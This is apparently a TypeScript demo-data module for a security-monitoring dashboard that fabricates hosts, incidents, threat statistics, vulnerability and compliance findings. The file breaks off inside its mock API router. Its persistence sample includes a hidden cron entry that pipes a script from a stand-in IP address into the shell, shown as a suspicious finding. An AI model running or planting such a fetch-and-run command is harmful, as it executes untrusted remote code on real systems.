// Демо-режим: повністю локальний «двигун» з правдоподібними даними.
// Дозволяє оцінити продукт без серверів і робити скриншоти. IP — лише з документаційних
// діапазонів (RFC 5737), імена хостів вигадані.
import type {
  AuditEvent,
  Attestations,
  ConnectionsReport,
  Container,
  ControlResult,
  HostState,
  Incident,
  IpIntel,
  MetricSample,
  Monitor,
  MonitorCheck,
  MonitorEvent,
  PersistenceReport,
  ProcessReport,
  SecurityPosture,
  SocConfig,
  ThreatReport,
  VulnReport,
  FimReport,
} from "./types";

import { settingsStore } from "./settings";
import { demoExtRequest } from "./demoExt";

/** Демо-тексти: українською для uk, англійською для решти мов. */
const L = (uk: string, en: string) => (settingsStore.value.lang === "uk" ? uk : en);

/* ---------------- Детермінований генератор ---------------- */

let seed = 42;
const rnd = () => {
  seed = (seed * 16807) % 2147483647;
  return (seed - 1) / 2147483646;
};
const ri = (a: number, b: number) => Math.floor(a + rnd() * (b - a + 1));
const pick = <T,>(arr: readonly T[]): T => arr[Math.floor(rnd() * arr.length)];
const NOW = () => Date.now();
const H = 3600000;
const D = 24 * H;
const ip = (n: number) => `${["203.0.113", "198.51.100", "192.0.2"][n % 3]}.${(n * 37) % 250 + 3}`;

/* ---------------- Хости ---------------- */

type HostSeed = { id: string; name: string; host: string; base: [number, number, number]; cores: number; mem: number; kernel: string; containers: string[] };

const HOSTS: HostSeed[] = [
  { id: "h_web01", name: "web-prod-01", host: "10.20.0.11", base: [34, 58, 61], cores: 8, mem: 16384, kernel: "6.8.0-45-generic", containers: ["nginx", "api-gateway", "node-app", "redis-cache"] },
  { id: "h_web02", name: "web-prod-02", host: "10.20.0.12", base: [41, 63, 57], cores: 8, mem: 16384, kernel: "6.8.0-45-generic", containers: ["nginx", "node-app", "otel-collector"] },
  { id: "h_db01", name: "db-primary", host: "10.20.1.5", base: [52, 81, 72], cores: 16, mem: 65536, kernel: "6.1.0-25-amd64", containers: ["postgres-16", "pgbouncer", "pg-exporter"] },
  { id: "h_edge", name: "edge-gateway", host: "10.20.0.2", base: [18, 37, 33], cores: 4, mem: 8192, kernel: "6.8.0-45-generic", containers: ["traefik", "crowdsec"] },
  { id: "h_k8s1", name: "k8s-worker-a", host: "10.20.3.21", base: [67, 72, 48], cores: 32, mem: 131072, kernel: "6.5.0-41-generic", containers: ["kubelet", "containerd", "cilium-agent", "fluent-bit", "prom-node"] },
  { id: "h_mail", name: "mail-relay", host: "10.20.4.8", base: [9, 29, 88], cores: 2, mem: 4096, kernel: "5.15.0-122-generic", containers: [] },
];

const IMAGES: Record<string, string> = {
  nginx: "nginx:1.27-alpine",
  "api-gateway": "kong:3.7",
  "node-app": "registry.local/app:2.14.3",
  "redis-cache": "redis:7.4",
  "otel-collector": "otel/opentelemetry-collector:0.108.0",
  "postgres-16": "postgres:16.4",
  pgbouncer: "bitnami/pgbouncer:1.23",
  "pg-exporter": "prometheuscommunity/postgres-exporter:0.15",
  traefik: "traefik:v3.1",
  crowdsec: "crowdsecurity/crowdsec:v1.6",
  kubelet: "k8s/kubelet:1.30",
  containerd: "containerd:1.7",
  "cilium-agent": "cilium/cilium:1.16",
  "fluent-bit": "fluent/fluent-bit:3.1",
  "prom-node": "prom/node-exporter:1.8",
};

const wave = (t: number, period: number, amp: number) => Math.sin((t / period) * Math.PI * 2) * amp;

function metricsAt(h: HostSeed, t: number) {
  const k = HOSTS.indexOf(h) + 1;
  const cpu = Math.max(2, Math.min(99, h.base[0] + wave(t + k * 7e5, 45 * 60000, 14) + wave(t, 6 * 60000, 5) + (Math.sin(t / 9973 + k) * 3)));
  const mem = Math.max(5, Math.min(97, h.base[1] + wave(t + k * 3e5, 80 * 60000, 6) + Math.sin(t / 7919) * 1.5));
  const disk = Math.min(96, h.base[2] + (t % D) / D * 0.6);
  const rx = Math.max(0, (2.4e6 + wave(t + k * 1e6, 30 * 60000, 1.6e6) + Math.sin(t / 3331) * 3e5) * (k === 4 ? 3 : 1));
  const tx = Math.max(0, (1.1e6 + wave(t + k * 9e5, 30 * 60000, 7e5)) * (k === 4 ? 2.5 : 1));
  const conn = Math.round(120 + wave(t, 20 * 60000, 60) + k * 40);
  return { cpu, mem, disk, rx, tx, conn };
}

function container(name: string, hi: number, t: number): Container {
  const exited = name === "otel-collector" && hi === 1;
  return {
    id: (name + hi).padEnd(12, "0").slice(0, 12),
    name,
    image: IMAGES[name] ?? `${name}:latest`,
    state: exited ? "exited" : "running",
    status: exited ? "Exited (137) 2 hours ago" : `Up ${ri(2, 40)} days`,
    ports: name === "nginx" ? "0.0.0.0:443->443/tcp, 0.0.0.0:80->80/tcp" : name === "postgres-16" ? "5432/tcp" : "",
    cpuPct: exited ? 0 : Math.max(0.1, 4 + Math.abs(Math.sin(t / 5000 + name.length)) * 22),
    memUsedMb: exited ? 0 : 80 + name.length * 41,
    memLimitMb: 2048,
  };
}

export function demoHosts(): HostState[] {
  const t = NOW();
  return HOSTS.map((h, i) => {
    const m = metricsAt(h, t);
    const offline = h.id === "h_mail" && Math.floor(t / 60000) % 9 === 0; // зрідка «блимає»
    return {
      id: h.id,
      name: h.name,
      host: h.host,
      port: 22,
      user: "soc",
      authType: "key",
      keyPath: "~/.ssh/id_ed25519",
      interval: 5,
      hasPassword: false,
      hostKey: `SHA256:${btoa(h.id + h.host).replace(/=+$/, "").padEnd(43, "Q").slice(0, 43)}`,
      tags: i < 2 ? ["prod", "web"] : i === 2 ? ["prod", "db"] : i === 3 ? ["edge"] : i === 4 ? ["k8s"] : ["mail"],
      jumpHostId: i === 2 ? "h_edge" : "",
      proxy: { type: "none", host: "", port: 0, user: "", hasPass: false },
      status: offline ? "connecting" : "online",
      error: "",
      metrics: {
        cpu: Math.round(m.cpu * 10) / 10,
        memTotalMb: h.mem,
        memUsedMb: Math.round((h.mem * m.mem) / 100),
        memPct: Math.round(m.mem),
        diskTotalKb: 512 * 1024 * 1024,
        diskUsedKb: Math.round(512 * 1024 * 1024 * (m.disk / 100)),
        diskPct: Math.round(m.disk),
        uptimeSec: 86400 * (12 + i * 9) + (t / 1000) % 86400,
        load1: Math.round(((m.cpu / 100) * h.cores) * 100) / 100,
        kernel: h.kernel,
        cores: h.cores,
        hostname: h.name,
        netRxBps: m.rx,
        netTxBps: m.tx,
        netRxTotal: 8e11 + i * 1e11,
        netTxTotal: 3e11 + i * 5e10,
        connections: m.conn,
      },
      containers: h.containers.map((c) => container(c, i, t)),
      networks: h.containers.length ? [{ id: "a1b2c3", name: "bridge", driver: "bridge", scope: "local" }, { id: "d4e5f6", name: `${h.name}-net`, driver: "bridge", scope: "local" }] : [],
      volumes: h.containers.length ? [{ name: `${h.name}-data`, driver: "local", scope: "local", mountpoint: `/var/lib/docker/volumes/${h.name}-data/_data` }] : [],
      dockerVersion: h.containers.length ? "27.2.0" : "-",
      updatedAt: t,
    };
  });
}

function history(id: string): MetricSample[] {
  const h = HOSTS.find((x) => x.id === id) ?? HOSTS[0];
  const t = NOW();
  return Array.from({ length: 180 }, (_, i) => {
    const at = t - (179 - i) * 60000;
    const m = metricsAt(h, at);
    return { at, cpu: m.cpu, memPct: m.mem, diskPct: m.disk, rx: m.rx, tx: m.tx, conn: m.conn };
  });
}

/* ---------------- Інциденти й аудит ---------------- */

const INC_TPL: [string, string, Incident["severity"], string][] = [
  ["Брутфорс SSH на {h}", "SSH brute force on {h}", "high", "brute-force"],
  ["Сканування портів з зовнішньої адреси", "Port scan from external address", "low", "recon / scan"],
  ["Підозрілий cron-запис у /etc/cron.d", "Suspicious cron entry in /etc/cron.d", "high", "persistence"],
  ["Процес-майнер xmrig на {h}", "Crypto-miner xmrig running on {h}", "critical", "malware"],
  ["Відкритий Redis 6379 у публічну мережу", "Redis 6379 exposed to the internet", "critical", "exposure"],
  ["Вимкнено auditd на {h}", "auditd disabled on {h}", "medium", "misconfiguration"],
  ["Ескалація привілеїв через sudoers", "Privilege escalation via sudoers", "high", "privilege-escalation"],
  ["Змінено /etc/ssh/sshd_config (FIM)", "/etc/ssh/sshd_config modified (FIM)", "medium", "integrity"],
  ["Аномальний вихідний трафік на 198.51.100.77", "Anomalous outbound traffic to 198.51.100.77", "high", "exfiltration"],
  ["Недоступний сервіс api.example.org", "Service api.example.org unreachable", "medium", "downtime"],
  ["Повторні невдалі входи sudo", "Repeated failed sudo attempts", "low", "credential access"],
  ["Новий SUID-бінарник у /tmp", "New SUID binary in /tmp", "high", "privilege-escalation"],
  ["Фішинговий лист із вкладенням", "Phishing email with attachment", "medium", "phishing"],
  ["Бекон на нетиповий домен (C2)", "Beacon to unusual domain (C2)", "critical", "c2 beacon"],
];
const ASSIGNEES = ["o.kovalenko", "m.nowak", "d.shevchenko", "l1-queue", "a.lin"];

let incidentsLang = "";
let incidentsCache: Incident[] = [];
/** Інциденти генеруються під поточну мову (і зберігають зміни в межах мови). */
function getIncidents(): Incident[] {
  const lang = settingsStore.value.lang === "uk" ? "uk" : "en";
  if (lang !== incidentsLang) {
    incidentsLang = lang;
    incidentsCache = genIncidents();
  }
  return incidentsCache;
}
function setIncidents(list: Incident[]) {
  incidentsCache = list;
}

function genIncidents(): Incident[] {
  seed = 7;
  const out: Incident[] = [];
  for (let n = 0; n < 34; n++) {
    const [tUk, tEn, sev, cat] = pick(INC_TPL);
    const title = L(tUk, tEn);
    const h = pick(HOSTS);
    const created = NOW() - ri(1, 29 * 24) * H - ri(0, 59) * 60000;
    const age = NOW() - created;
    const status: Incident["status"] = age > 6 * D ? (rnd() > 0.15 ? "closed" : "mitigated") : pick(["open", "investigating", "mitigated", "closed", "open"] as const);
    const ack = created + ri(4, 90) * 60000;
    const closedAt = created + ri(2, 40) * H;
    out.push({
      id: `inc_${n.toString(36)}${ri(100, 999)}`,
      title: title.replace("{h}", h.name),
      severity: sev,
      status,
      hostId: h.id,
      assignee: pick(ASSIGNEES),
      detail: L("Автоматично скорельовано з подій хоста. Перевір таймлайн і застосуй рекомендований плейбук.", "Automatically correlated from host events. Review the timeline and apply the recommended playbook."),
      category: cat,
      createdAt: created,
      updatedAt: status === "closed" || status === "mitigated" ? Math.min(NOW(), closedAt) : ack,
      timeline: [
        { at: created, text: L("Інцидент створено правилом кореляції", "Incident created by correlation rule") },
        { at: ack, text: L("Взято в роботу аналітиком", "Picked up by an analyst") },
        ...(status === "closed" ? [{ at: Math.min(NOW(), closedAt), text: L("Закрито: загрозу усунено", "Closed: threat remediated") }] : []),
      ],
    });
  }
  return out.sort((a, b) => b.createdAt - a.createdAt);
}

const ACTIONS = ["host.connect", "scan.security", "scan.vulns", "incident.update", "incident.create", "compliance.run", "terminal.open", "monitor.check", "container.restart", "playbook.run", "fim.baseline", "ioc.lookup"];
const audit: AuditEvent[] = (() => {
  seed = 11;
  const out: AuditEvent[] = [];
  for (let n = 0; n < 420; n++) {
    const dayAgo = ri(0, 13);
    const hour = rnd() < 0.78 ? ri(8, 19) : ri(0, 23);
    const d = new Date(NOW() - dayAgo * D);
    d.setHours(hour, ri(0, 59), ri(0, 59), 0);
    if (d.getTime() > NOW()) continue;
    out.push({ at: d.getTime(), actor: pick(["analyst", "system", "o.kovalenko", "m.nowak"]), action: pick(ACTIONS), target: pick(HOSTS).name, meta: {} });
  }
  return out.sort((a, b) => b.at - a.at);
})();

/* ---------------- Загрози ---------------- */

const GEO = [
  { cc: "CN", country: "China", city: "Shanghai", isp: "Example Telecom", lat: 31.2, lon: 121.5 },
  { cc: "RU", country: "Russia", city: "Moscow", isp: "Example Hosting", lat: 55.8, lon: 37.6 },
  { cc: "US", country: "United States", city: "Ashburn", isp: "Example Cloud", lat: 39.0, lon: -77.5 },
  { cc: "BR", country: "Brazil", city: "São Paulo", isp: "Example Net", lat: -23.5, lon: -46.6 },
  { cc: "IN", country: "India", city: "Mumbai", isp: "Example Broadband", lat: 19.1, lon: 72.9 },
  { cc: "VN", country: "Vietnam", city: "Hanoi", isp: "Example VN", lat: 21.0, lon: 105.8 },
  { cc: "NL", country: "Netherlands", city: "Amsterdam", isp: "Example VPS", lat: 52.4, lon: 4.9 },
  { cc: "KR", country: "South Korea", city: "Seoul", isp: "Example KR", lat: 37.6, lon: 127.0 },
  { cc: "DE", country: "Germany", city: "Frankfurt", isp: "Example DC", lat: 50.1, lon: 8.7 },
  { cc: "ID", country: "Indonesia", city: "Jakarta", isp: "Example ID", lat: -6.2, lon: 106.8 },
  { cc: "IR", country: "Iran", city: "Tehran", isp: "Example IR", lat: 35.7, lon: 51.4 },
  { cc: "ZA", country: "South Africa", city: "Johannesburg", isp: "Example ZA", lat: -26.2, lon: 28.0 },
];

function threats(): ThreatReport {
  seed = 23;
  const attackers = Array.from({ length: 26 }, (_, n) => {
    const g = GEO[n % GEO.length];
    return { ip: ip(n), count: Math.round(2400 / (n + 1.4) + ri(4, 60)), geo: { country: g.country, countryCode: g.cc, city: g.city, isp: g.isp, lat: g.lat + (rnd() - 0.5) * 3, lon: g.lon + (rnd() - 0.5) * 3 } };
  }).sort((a, b) => b.count - a.count);
  const countries = new Map<string, { cc: string; country: string; count: number }>();
  for (const a of attackers) {
    const c = countries.get(a.geo.countryCode) ?? { cc: a.geo.countryCode, country: a.geo.country, count: 0 };
    c.count += a.count;
    countries.set(a.geo.countryCode, c);
  }
  return {
    attackers,
    users: [["root", 4120], ["admin", 1630], ["ubuntu", 980], ["test", 640], ["postgres", 512], ["oracle", 288], ["git", 214], ["deploy", 162]].map(([user, count]) => ({ user: String(user), count: Number(count) })),
    accepted: [{ ip: "10.20.9.4", count: 42 }, { ip: "10.20.9.7", count: 17 }],
    countries: [...countries.values()].sort((a, b) => b.count - a.count),
    total: attackers.reduce((s, a) => s + a.count, 0),
    uniqueIps: attackers.length,
    at: NOW(),
  };
}

function posture(id: string): SecurityPosture {
  const k = Math.max(0, HOSTS.findIndex((h) => h.id === id));
  const weak = k === 2 || k === 5;
  return {
    risk: weak ? 46 : 18 + k * 3,
    grade: weak ? "warning" : "info",
    findings: [
      { severity: weak ? "critical" : "warning", text: weak ? L("PasswordAuthentication увімкнено", "PasswordAuthentication is enabled") : "MaxAuthTries > 4" },
      { severity: "warning", text: L(`${3 + k} пакетів з security-оновленнями`, `${3 + k} packages with pending security updates`) },
      { severity: "info", text: L("fail2ban активний, 12 банів за добу", "fail2ban active, 12 bans in the last day") },
      ...(weak ? [{ severity: "critical" as const, text: L("Порт 6379 відкритий на 0.0.0.0", "Port 6379 listening on 0.0.0.0") }] : []),
    ],
    ports: [
      { proto: "tcp", port: 22, addr: "0.0.0.0", public: true },
      { proto: "tcp", port: 443, addr: "0.0.0.0", public: k < 2 || k === 3 },
      { proto: "tcp", port: 80, addr: "0.0.0.0", public: k < 2 },
      { proto: "tcp", port: 9100, addr: "127.0.0.1", public: false },
      ...(weak ? [{ proto: "tcp", port: 6379, addr: "0.0.0.0", public: true }] : []),
    ],
    publicPortCount: weak ? 3 : 2,
    sessions: [{ user: "soc", tty: "pts/0", from: "10.20.9.4" }],
    lastLogins: ["soc pts/0 10.20.9.4 Mon 09:12", "deploy pts/1 10.20.9.7 Sun 22:40"],
    failedLogins: weak ? 1840 : 120 + k * 40,
    firewall: { tool: "nftables", active: !weak },
    updates: 3 + k,
    suid: 18 + k,
    ssh: { rootLogin: weak ? "yes" : "prohibit-password", passwordAuth: weak ? "yes" : "no", emptyPasswords: "no", x11: "no", maxAuthTries: weak ? "6" : "3" },
    fail2ban: true,
    at: NOW(),
  };
}

function vulns(id: string): VulnReport {
  const k = Math.max(0, HOSTS.findIndex((h) => h.id === id));
  const cats = [
    ["patching", "Патчі", 4, 2 + (k % 2)],
    ["ssh", "SSH", 5, k === 2 || k === 5 ? 2 : 4],
    ["exposure", "Експозиція", 4, k === 2 ? 1 : 3],
    ["accounts", "Облікові записи", 4, 3],
    ["filesystem", "Файлова система", 3, 2],
    ["services", "Сервіси", 3, 3],
  ] as const;
  const findings = [
    { id: "sec-updates", title: L("Є непоставлені security-оновлення", "Pending security updates"), category: "patching", categoryLabel: "Патчі", severity: "high", status: "vuln", detail: L(`${4 + k} security-оновлень очікують (openssl, sudo, libc6)`, `${4 + k} security updates pending (openssl, sudo, libc6)`), remediation: "sudo apt update && sudo apt upgrade" },
    { id: "ssh-pass", title: L("Вхід по паролю SSH", "SSH password login"), category: "ssh", categoryLabel: "SSH", severity: "high", status: k === 2 || k === 5 ? "vuln" : "ok", detail: "PasswordAuthentication yes", remediation: L("PasswordAuthentication no у sshd_config", "Set PasswordAuthentication no in sshd_config") },
    { id: "redis-public", title: L("Redis слухає на 0.0.0.0", "Redis listening on 0.0.0.0"), category: "exposure", categoryLabel: "Експозиція", severity: "critical", status: k === 2 ? "vuln" : "ok", detail: L("6379/tcp без автентифікації", "6379/tcp without authentication"), remediation: L("bind 127.0.0.1 та requirepass", "bind 127.0.0.1 and set requirepass") },
    { id: "reboot", title: L("Потрібне перезавантаження", "Reboot required"), category: "patching", categoryLabel: "Патчі", severity: "medium", status: k % 2 ? "vuln" : "ok", detail: L("Оновлено ядро", "Kernel updated"), remediation: L("sudo reboot у вікно обслуговування", "sudo reboot during a maintenance window") },
    { id: "ww-files", title: L("World-writable файли в /etc", "World-writable files in /etc"), category: "filesystem", categoryLabel: "Файлова система", severity: "medium", status: "vuln", detail: "/etc/app/conf.d/override.conf", remediation: "chmod o-w" },
    { id: "uid0", title: L("Лише один акаунт з UID 0", "Only one account with UID 0"), category: "accounts", categoryLabel: "Облікові записи", severity: "critical", status: "ok", detail: "root", remediation: "—" },
    { id: "pass-max", title: "PASS_MAX_DAYS > 365", category: "accounts", categoryLabel: "Облікові записи", severity: "low", status: "vuln", detail: "PASS_MAX_DAYS 99999", remediation: L("Встанови 365 у /etc/login.defs", "Set 365 in /etc/login.defs") },
  ] as VulnReport["findings"];
  const v = findings.filter((f) => f.status === "vuln");
  const bySeverity: Record<string, number> = { critical: 0, high: 0, medium: 0, low: 0, info: 0 };
  for (const f of v) bySeverity[f.severity]++;
  const categories = cats.map(([cat, label, total, passed]) => ({ cat, label, total, passed, pct: Math.round((passed / total) * 100) }));
  const sec = Math.round(categories.reduce((a, c) => a + c.pct, 0) / categories.length);
  return { secScore: sec, risk: 100 - sec, grade: sec >= 85 ? "ok" : sec >= 60 ? "info" : "warning", findings, vulnCount: v.length, bySeverity, categories, os: "Ubuntu 24.04.1 LTS", at: NOW() };
}

const CONTROLS = (): ControlResult[] => [
  ["ssh-root", L("Вхід root по SSH заборонено", "Root SSH login disabled"), "CIS 5.2.7", "critical"],
  ["ssh-pass", L("Вхід по паролю вимкнено", "Password authentication disabled"), "CIS 5.2.10", "warning"],
  ["ssh-empty", L("Порожні паролі заборонено", "Empty passwords forbidden"), "CIS 5.2.9", "critical"],
  ["ssh-x11", L("X11Forwarding вимкнено", "X11Forwarding disabled"), "CIS 5.2.6", "info"],
  ["ssh-maxauth", "MaxAuthTries ≤ 4", "CIS 5.2.5", "warning"],
  ["firewall", L("Фаєрвол активний", "Firewall active"), "CIS 3.5", "critical"],
  ["auto-updates", L("Автооновлення безпеки", "Automatic security updates"), "CIS 1.9", "warning"],
  ["fail2ban", L("Захист від брутфорсу", "Brute-force protection"), "NIST AC-7", "warning"],
  ["auditd", L("auditd працює", "auditd running"), "CIS 4.1", "warning"],
  ["timesync", L("Синхронізація часу", "Time synchronisation"), "CIS 2.1", "info"],
  ["pass-max", L("Термін дії паролів", "Password expiry"), "CIS 5.4.1.1", "info"],
  ["ww-etc", L("Немає world-writable у /etc", "No world-writable files in /etc"), "CIS 6.1", "warning"],
  ["single-root", L("Один UID 0", "Single UID 0"), "CIS 5.4.2", "critical"],
].map(([id, title, framework, severity], n) => ({
  id,
  title,
  framework,
  severity,
  status: n === 1 || n === 8 || n === 10 ? "fail" : n === 9 ? "unknown" : "pass",
  evidence: n === 1 ? "PasswordAuthentication yes" : n === 8 ? "auditd inactive" : "ok",
}));
const MANUAL = () => [
  ["m-access-review", L("Перегляд доступів проводиться щоквартально", "Quarterly access review"), "ISO 27001 A.9", "warning"],
  ["m-backups", L("Резервні копії налаштовані й протестовані", "Backups configured and tested"), "ISO 27001 A.12.3", "critical"],
  ["m-ir-plan", L("План реагування на інциденти задокументовано", "Incident response plan documented"), "NIST IR-8", "warning"],
  ["m-retention", L("Політику зберігання даних визначено", "Data retention policy defined"), "GDPR Art.5", "info"],
  ["m-mfa", L("MFA для адмін-доступу увімкнено", "MFA enabled for admin access"), "NIST IA-2", "critical"],
  ["m-vuln-scan", L("Сканування вразливостей за розкладом", "Scheduled vulnerability scanning"), "NIST RA-5", "warning"],
  ["m-central-log", L("Логування/моніторинг централізовано", "Centralised logging/monitoring"), "NIST AU-6", "info"],
  ["m-encryption", L("Шифрування чутливих даних у спокої", "Encryption of sensitive data at rest"), "ISO 27001 A.10", "warning"],
].map(([id, title, framework, severity]) => ({ id, title, framework, severity }));
let attest: Attestations = {
  "m-backups": { status: "attested", note: "restic, daily, restore test 01.10", at: NOW() - 9 * D },
  "m-mfa": { status: "attested", note: "WebAuthn for all admins", at: NOW() - 20 * D },
  "m-ir-plan": { status: "attested", note: "Confluence / IR-Plan v3", at: NOW() - 40 * D },
  "m-retention": { status: "na", note: "No personal data stored", at: NOW() - 60 * D },
};

/* ---------------- EDR / NDR ---------------- */

const PROCS = ["postgres", "node", "nginx", "dockerd", "containerd", "kubelet", "redis-server", "sshd", "systemd-journald", "fluent-bit", "cron", "rsyslogd", "prometheus", "python3", "java"];
function processes(id: string): ProcessReport {
  seed = 100 + id.length;
  const list = PROCS.map((comm, n) => ({ user: n < 3 ? comm : "root", pid: 400 + n * 137, ppid: 1, cpu: Math.round((30 / (n + 1) + rnd() * 4) * 10) / 10, mem: Math.round((18 / (n + 1.5) + rnd() * 2) * 10) / 10, uptimeSec: ri(3600, 3e6), stat: "S", comm }));
  return { processes: list, total: 212 + id.length, cpuSum: list.reduce((a, p) => a + p.cpu, 0), memSum: list.reduce((a, p) => a + p.mem, 0), at: NOW() };
}
function persistence(): PersistenceReport {
  const cron = [
    { source: "/etc/crontab", entry: "17 * * * * root cd / && run-parts --report /etc/cron.hourly" },
    { source: "/etc/cron.d/certbot", entry: "0 */12 * * * root certbot -q renew" },
    { source: "/var/spool/cron/crontabs/deploy", entry: "*/5 * * * * /home/deploy/bin/sync.sh" },
    { source: "/etc/cron.d/.sysupdate", entry: "*/10 * * * * root curl -fsSL http://198.51.100.77/u.sh | sh" },
  ];
  const running = ["ssh.service", "docker.service", "containerd.service", "nginx.service", "fail2ban.service", "systemd-journald.service", "cron.service", "node-exporter.service"];
  const enabled = [...running, "unattended-upgrades.service", "apparmor.service"];
  const timers = ["apt-daily.timer", "logrotate.timer", "certbot.timer", "fstrim.timer"];
  return { cron, running, enabled, timers, startup: ["/etc/rc.local"], counts: { cron: cron.length, running: running.length, enabled: enabled.length, timers: timers.length }, at: NOW() };
}
function connections(): ConnectionsReport {
  const listening = [
    ["tcp", "0.0.0.0:22", "sshd"], ["tcp", "0.0.0.0:443", "nginx"], ["tcp", "0.0.0.0:80", "nginx"], ["tcp", "127.0.0.1:5432", "postgres"], ["tcp", "127.0.0.1:6379", "redis-server"], ["tcp", "0.0.0.0:9100", "node_exporter"], ["udp", "0.0.0.0:53", "systemd-resolve"],
  ].map(([proto, local, process]) => ({ proto, state: "LISTEN", local, peer: "*:*", process }));
  const established = Array.from({ length: 24 }, (_, n) => ({ proto: "tcp", state: n % 7 === 0 ? "TIME-WAIT" : n % 9 === 0 ? "CLOSE-WAIT" : "ESTAB", local: `10.20.0.11:${n % 3 ? 443 : 22}`, peer: `${n % 4 ? "10.20." + (n % 5) + "." + (n + 10) : ip(n)}:${40000 + n * 13}`, process: n % 3 ? "nginx" : "sshd" }));
  return { established, listening, estabCount: established.length, listenCount: listening.length, at: NOW() };
}

/* ---------------- Uptime ---------------- */

let monitors: Monitor[] = [
  { id: "m1", name: "Public website", url: "https://www.example.com", method: "GET", expectStatus: 200, intervalSec: 60, timeoutMs: 8000, enabled: true },
  { id: "m2", name: "API", url: "https://api.example.org/health", method: "GET", expectStatus: 200, intervalSec: 30, timeoutMs: 5000, enabled: true },
  { id: "m3", name: "Customer portal", url: "https://portal.example.net", method: "HEAD", expectStatus: 200, intervalSec: 60, timeoutMs: 8000, enabled: true },
  { id: "m4", name: "Status page", url: "https://status.example.com", method: "GET", expectStatus: 200, intervalSec: 120, timeoutMs: 8000, enabled: true },
];
function monHistory(id: string): MonitorCheck[] {
  seed = id.charCodeAt(1) * 31;
  const base = { m1: 180, m2: 95, m3: 320, m4: 140 }[id] ?? 200;
  return Array.from({ length: 90 }, (_, n) => {
    const down = (id === "m2" && (n === 61 || n === 62)) || (id === "m3" && n === 33);
    return { at: NOW() - (89 - n) * 60000, ok: !down, status: down ? 503 : 200, ms: down ? 0 : Math.round(base + Math.sin(n / 6) * base * 0.25 + rnd() * base * 0.2), error: down ? "HTTP 503" : "" };
  });
}
function monStats(id: string) {
  const h = monHistory(id);
  const ok = h.filter((c) => c.ok);
  return { uptimePct: Math.round((ok.length / h.length) * 10000) / 100, checks: h.length, avgMs: Math.round(ok.reduce((a, c) => a + c.ms, 0) / Math.max(1, ok.length)), last: h[h.length - 1], up: h[h.length - 1].ok };
}
const monEvents: MonitorEvent[] = [
  { monitorId: "m2", name: "API", url: "https://api.example.org/health", ok: true, status: 200, ms: 101, error: "", at: NOW() - 26 * 60000 },
  { monitorId: "m2", name: "API", url: "https://api.example.org/health", ok: false, status: 503, ms: 0, error: "HTTP 503", at: NOW() - 28 * 60000 },
  { monitorId: "m3", name: "Customer portal", url: "https://portal.example.net", ok: true, status: 200, ms: 344, error: "", at: NOW() - 55 * 60000 },
  { monitorId: "m3", name: "Customer portal", url: "https://portal.example.net", ok: false, status: 0, ms: 0, error: "timeout", at: NOW() - 56 * 60000 },
];

/* ---------------- FIM ---------------- */

function fim(id: string): FimReport {
  const files = ["/etc/passwd", "/etc/shadow", "/etc/group", "/etc/sudoers", "/etc/ssh/sshd_config", "/etc/hosts", "/etc/crontab", "/root/.ssh/authorized_keys", "/etc/systemd/system", "/usr/bin/sudo", "/etc/pam.d/sshd", "/etc/ld.so.preload"];
  const changed = id === "h_web01" ? ["/etc/ssh/sshd_config", "/root/.ssh/authorized_keys"] : id === "h_db01" ? ["/etc/crontab"] : [];
  return {
    baselineAt: NOW() - 6 * D,
    at: NOW(),
    files: files.map((path, n) => ({
      path,
      sha256: path === "/etc/ld.so.preload" ? "" : (path.length * 2654435761 + n).toString(16).padStart(8, "0").repeat(8).slice(0, 64),
      size: 400 + path.length * 37,
      mode: path.includes("shadow") ? "640" : path.includes("sudoers") ? "440" : "644",
      owner: "root",
      mtime: NOW() - (changed.includes(path) ? ri(1, 30) * H : ri(10, 200) * D),
      status: changed.includes(path) ? "modified" : path === "/etc/ld.so.preload" ? "missing" : "ok",
    })),
    changed: changed.length,
  };
}

/* ---------------- Маршрутизатор ---------------- */

let soc: SocConfig = { autoIncidents: true, bruteThreshold: 300, notifyDowntime: true, retentionDays: 90, sweepMinutes: 5 };

const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms));

export async function demoRequest(method: string, url: string, body?: unknown): Promise<unknown> {
  await sleep(140 + Math.random() * 160);
  const u = new URL(url, "http://demo");
  const p = u.pathname;
  const m = (re: RegExp) => p.match(re);
  let r: RegExpMatchArray | null;

  if (/^\/api\/(info|network|security|backup|integrations|wazuh|rules|agents)/.test(p) || /\/hostkey\/reset$/.test(p)) {
    const r = demoExtRequest(method, p, body);
    if (r !== undefined) return r;
    if (/hostkey/.test(p)) return { ok: true };
  }
  const incidents = getIncidents();
  if (p === "/api/incidents" && method === "GET") return incidents;
  if (p === "/api/incidents" && method === "POST") {
    const inc = { ...(body as Incident), id: `inc_${Date.now().toString(36)}`, createdAt: NOW(), updatedAt: NOW(), timeline: [{ at: NOW(), text: L("Створено вручну", "Created manually") }] };
    setIncidents([inc, ...incidents]);
    return inc;
  }
  if ((r = m(/^\/api\/incidents\/([^/]+)$/))) {
    if (method === "DELETE") {
      setIncidents(incidents.filter((i) => i.id !== r![1]));
      return { ok: true };
    }
    setIncidents(incidents.map((i) => (i.id === r![1] ? { ...i, ...(body as object), updatedAt: NOW() } : i)));
    return getIncidents().find((i) => i.id === r![1]);
  }
  if (p === "/api/audit") return { events: audit.slice(0, parseInt(u.searchParams.get("limit") || "500", 10)) };
  if (p === "/api/soc") {
    if (method === "PUT") soc = { ...soc, ...(body as object) };
    return soc;
  }
  if (p === "/api/compliance/controls") return { auto: CONTROLS().map(({ id, title, framework, severity }) => ({ id, title, framework, severity })), manual: MANUAL(), attest };
  if ((r = m(/^\/api\/compliance\/attest\/(.+)$/))) {
    attest = { ...attest, [r[1]]: { ...(body as { status: "attested"; note: string }), at: NOW() } };
    return { ok: true, attest };
  }
  if (p === "/api/monitors" && method === "GET") return monitors.map((x) => ({ ...x, stats: monStats(x.id) }));
  if (p === "/api/monitors" && method === "POST") {
    const mon = { ...(body as Monitor), id: `m${Date.now()}` };
    monitors = [...monitors, mon];
    return mon;
  }
  if (p === "/api/monitors/events") return { events: monEvents };
  if ((r = m(/^\/api\/monitors\/([^/]+)\/history$/))) return { history: monHistory(r[1]), stats: monStats(r[1]) };
  if ((r = m(/^\/api\/monitors\/([^/]+)\/check$/))) return monHistory(r[1]).at(-1);
  if ((r = m(/^\/api\/monitors\/([^/]+)$/))) {
    if (method === "DELETE") monitors = monitors.filter((x) => x.id !== r![1]);
    else monitors = monitors.map((x) => (x.id === r![1] ? { ...x, ...(body as object) } : x));
    return { ok: true };
  }
  if (p === "/api/dbs") return [];
  if (p === "/api/hosts/test") return { ok: true, output: "demo: SSH OK · Ubuntu 24.04" };

  if ((r = m(/^\/api\/hosts\/([^/]+)\/(\w[\w-]*)$/))) {
    const [, id, what] = r;
